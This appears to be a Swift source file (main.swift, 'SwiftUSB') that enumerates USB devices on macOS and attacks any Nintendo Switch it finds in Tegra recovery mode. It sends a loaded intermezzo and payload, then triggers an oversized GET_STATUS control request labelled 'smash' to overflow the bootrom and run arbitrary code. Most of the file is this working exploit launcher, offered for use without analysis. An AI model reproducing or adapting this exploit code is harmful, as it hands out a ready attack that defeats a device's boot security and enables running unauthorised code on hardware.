//
//  main.swift
//  SwiftUSB
//
//  Created by Brandon on 2019-07-26.
//  Copyright © 2019 XIO. All rights reserved.
//

import Foundation
import IOKit

func isNintendoSwitch(device: USBDevice) -> Bool {
	let descriptor = device.getDescriptor()
	return descriptor.idVendor == 0x0955 && descriptor.idProduct == 0x7321
}

func writeNintendo(_ device: USBDevice, endpoint: Endpoint, buffer: UnsafeMutableRawPointer, size: UInt32) -> Bool {
	var didWrite = true
	let packetSize = 0x1000
	
	var ptr = buffer
	var length = Int(size)
	
	while length > 0 {
		let amount = min(packetSize, Int(length))
		didWrite = device.write(endpoint, buffer: ptr, size: UInt32(amount)) && didWrite
		ptr = ptr.advanced(by: amount)
		length -= amount
	}
	return didWrite
}

do {
	try USBDevice.getDevices().forEach({ device in
		
		print("\n")
		print("Device Name: \(device.get_device_name())")
		print("Manufacturer: \(device.get_manufacturer())")
		print("Serial Number: \(device.get_serial_number())")
		print("Vendor ID: \(device.get_vendor_id())")
		print("Product ID: \(device.get_product_id())")
		print("Descriptor Length: \(device.get_descriptor_length())")
		print("Descriptor Type: \(device.get_descriptor_type())")
		print("Device Release Number: \(device.get_device_release_number())")
		print("Max Packet Size: \(device.get_max_packet_size())")
		print("Number of Configurations: \(device.get_number_of_configurations())")
		print("\n")
		
		if isNintendoSwitch(device: device) && device.open() {
			defer { _ = device.close() }
			
			if !device.set_configuration(1) {
				return
			}
			
			if !device.claim_interface(0) {
				return
			}
			
			let uuid_to_string = {(uuid: [UInt8]) -> String in
				return String(format: "{%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x}", uuid[0], uuid[1], uuid[2], uuid[3], uuid[4], uuid[5], uuid[6], uuid[7],
							  uuid[8], uuid[9], uuid[10], uuid[11], uuid[12], uuid[13], uuid[14], uuid[15])
			};
			
			var deviceId = [UInt8](repeating: 0, count: 16)
			_ = device.read([.in, .standard, .interface], into: &deviceId, size: 16)
			
			print("\n")
			print("Device Name: \(device.get_device_name())")
			print("Manufacturer: \(device.get_manufacturer())")
			print("Serial Number: \(uuid_to_string(deviceId))")
			print("Vendor ID: \(device.get_vendor_id())")
			print("Product ID: \(device.get_product_id())")
			print("Descriptor Length: \(device.get_descriptor_length())")
			print("Descriptor Type: \(device.get_descriptor_type())")
			print("Device Release Number: \(device.get_device_release_number())")
			print("Max Packet Size: \(device.get_max_packet_size())")
			print("Number of Configurations: \(device.get_number_of_configurations())")
			print("\n")
			
			let intermezzo_data = loadIntermezzo()
			let payload_data = loadPayload()
			
			var payload = createPayload(intermezzo: intermezzo_data, payload: payload_data)
			_ = device.write([.out, .standard, .interface], buffer: &payload, size: UInt32(payload.count))
			
			
			var high_buffer = [UInt8](repeating: 0x00, count: 0x1000)
			_ = writeNintendo(device, endpoint: [.out, .standard, .interface], buffer: &high_buffer, size: UInt32(high_buffer.count))
			
			var smash = [UInt8](repeating: 0x00, count: 0x7000)
			_ = device.controlRequest([.in, .standard, .interface], bRequest: UInt8(kUSBRqGetStatus), wValue: 0, wIndex: 0, buffer: &smash, wLength: UInt16(smash.count))
		}
	})
} catch {
	print(error)
}

